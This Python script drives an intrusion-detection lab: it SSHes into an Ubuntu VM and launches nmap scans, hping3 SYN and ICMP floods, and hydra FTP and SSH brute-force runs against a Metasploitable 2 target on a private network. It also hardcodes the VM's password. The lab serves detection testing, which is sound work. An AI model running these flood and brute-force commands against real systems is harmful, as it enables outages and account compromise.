"""
Controlled Attack Lab — AI-Powered IDS
Launches real attacks from Ubuntu against Metasploitable 2 via SSH.
Run alongside app.py to demonstrate the full attack detection pipeline.

Lab:
  Attacker  (Ubuntu):         192.168.126.128  user: silvalkg
  Target    (Metasploitable): 192.168.126.130
"""

import paramiko
import time
import sys

ATTACKER_IP   = "192.168.126.128"
ATTACKER_USER = "silvalkg"
ATTACKER_PASS = "geeneth280"
TARGET_IP     = "192.168.126.130"

ATTACKS = [
    {
        "name":        "Port Scan",
        "category":    "PROBE",
        "color":       "\033[93m",
        "command":     f"sudo nmap -sS {TARGET_IP} 2>&1 | tail -5",
        "duration":    15,
        "description": "Nmap SYN scan — discovers open ports on target",
    },
    {
        "name":        "Service Version Scan",
        "category":    "PROBE",
        "color":       "\033[93m",
        "command":     f"sudo nmap -sV {TARGET_IP} 2>&1 | tail -5",
        "duration":    20,
        "description": "Nmap service detection — identifies running services",
    },
    {
        "name":        "SYN Flood",
        "category":    "DoS",
        "color":       "\033[91m",
        "command":     f"sudo timeout 10 hping3 -S --flood -V {TARGET_IP} 2>&1 | tail -5",
        "duration":    12,
        "description": "hping3 SYN flood — overwhelms target with TCP SYN packets",
    },
    {
        "name":        "ICMP Flood",
        "category":    "DoS",
        "color":       "\033[91m",
        "command":     f"sudo timeout 10 hping3 --icmp --flood {TARGET_IP} 2>&1 | tail -5",
        "duration":    12,
        "description": "hping3 ICMP flood — ping flood attack",
    },
    {
        "name":        "FTP Brute Force",
        "category":    "R2L",
        "color":       "\033[94m",
        "command":     f"hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 ftp://{TARGET_IP} 2>&1 | tail -5 || hydra -l msfadmin -p msfadmin -t 4 ftp://{TARGET_IP} 2>&1 | tail -5",
        "duration":    20,
        "description": "Hydra FTP brute force — credential stuffing attack",
    },
    {
        "name":        "SSH Brute Force",
        "category":    "R2L",
        "color":       "\033[94m",
        "command":     f"hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://{TARGET_IP} 2>&1 | tail -5 || hydra -l msfadmin -p msfadmin -t 4 ssh://{TARGET_IP} 2>&1 | tail -5",
        "duration":    20,
        "description": "Hydra SSH brute force — remote login attack",
    },
]

INSTALL_CMD = (
    "sudo apt-get install -y nmap hping3 hydra 2>&1 | tail -3"
)

# ANSI colors
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
GRAY   = "\033[90m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def line(char="─", width=62):
    print(GRAY + char * width + RESET)

def header():
    print()
    line("═")
    print(f"{BOLD}{CYAN}  🛡  AI-Powered IDS — Controlled Attack Lab{RESET}")
    line("═")
    print(f"  {WHITE}Attacker {RESET}: Ubuntu          {CYAN}{ATTACKER_IP}{RESET}")
    print(f"  {WHITE}Target   {RESET}: Metasploitable 2 {RED}{TARGET_IP}{RESET}")
    print(f"  {WHITE}Attacks  {RESET}: {len(ATTACKS)} planned")
    print(f"  {WHITE}Dashboard{RESET}: {CYAN}http://127.0.0.1:5000{RESET}")
    line("═")

def connect_ssh():
    print(f"\n{GRAY}Connecting to Ubuntu attacker ({ATTACKER_IP})...{RESET}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ATTACKER_IP, username=ATTACKER_USER,
                   password=ATTACKER_PASS, timeout=10)
    print(f"{GREEN}✓ SSH connection established{RESET}")
    return client

def run_cmd(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout, get_pty=True)
    stdin.write(ATTACKER_PASS + "\n")
    stdin.flush()
    out = stdout.read().decode(errors='ignore').strip()
    err = stderr.read().decode(errors='ignore').strip()
    return out or err

def install_tools(client):
    print(f"\n{GRAY}Checking attack tools on Ubuntu...{RESET}")
    run_cmd(client, INSTALL_CMD, timeout=120)
    print(f"{GREEN}✓ Tools ready (nmap, hping3, hydra){RESET}")

def run_attack(client, attack, index, total):
    print()
    line()
    cat_color = attack["color"]
    print(f"{BOLD}  [{index}/{total}] {WHITE}{attack['name']}{RESET}  "
          f"{cat_color}[{attack['category']}]{RESET}")
    line()
    print(f"  {GRAY}Description :{RESET} {attack['description']}")
    print(f"  {GRAY}Target      :{RESET} {RED}{TARGET_IP}{RESET}")
    print(f"  {GRAY}Command     :{RESET} {GRAY}{attack['command'][:60]}...{RESET}")
    print()
    print(f"  {YELLOW}► Launching attack...{RESET}")
    print(f"  {CYAN}► Watch dashboard: http://127.0.0.1:5000{RESET}")
    print()

    time.sleep(1)
    out = run_cmd(client, attack['command'], timeout=attack['duration'] + 15)
    if out:
        # Print last 3 lines of output
        lines = [l for l in out.split('\n') if l.strip()][-3:]
        for l in lines:
            print(f"  {GRAY}{l}{RESET}")

    print()
    print(f"  {GREEN}✓ Attack complete{RESET}")
    time.sleep(2)

def summary(results):
    print()
    line("═")
    print(f"{BOLD}{CYAN}  Attack Lab Complete — Summary{RESET}")
    line("═")
    print(f"  {'Attack':<25} {'Category':<10} {'Status'}")
    line()
    for name, cat, color, status, ok in results:
        status_str = f"{GREEN}✓ Launched{RESET}" if ok else f"{RED}✗ Failed{RESET}"
        print(f"  {WHITE}{name:<25}{RESET} {color}{cat:<10}{RESET} {status_str}")
    line("═")
    print(f"\n  {CYAN}Check dashboard for detections: http://127.0.0.1:5000{RESET}\n")

def main():
    header()
    print(f"\n  {YELLOW}Make sure app.py is running before continuing.{RESET}")
    input(f"\n  Press ENTER to start the attack lab...\n")

    try:
        client = connect_ssh()
    except Exception as e:
        print(f"\n{RED}✗ Could not connect to Ubuntu: {e}{RESET}")
        print(f"  Run on Ubuntu: {CYAN}sudo systemctl start ssh{RESET}")
        sys.exit(1)

    try:
        install_tools(client)
    except Exception as e:
        print(f"{YELLOW}⚠ Tool check warning: {e}{RESET}")

    results = []
    for i, attack in enumerate(ATTACKS, 1):
        print(f"\n  {GRAY}Next attack in 3 seconds...{RESET}")
        time.sleep(3)
        try:
            run_attack(client, attack, i, len(ATTACKS))
            results.append((attack['name'], attack['category'],
                           attack['color'], "Launched", True))
        except Exception as e:
            print(f"  {RED}✗ Failed: {e}{RESET}")
            results.append((attack['name'], attack['category'],
                           attack['color'], str(e), False))

    summary(results)
    client.close()

if __name__ == "__main__":
    main()
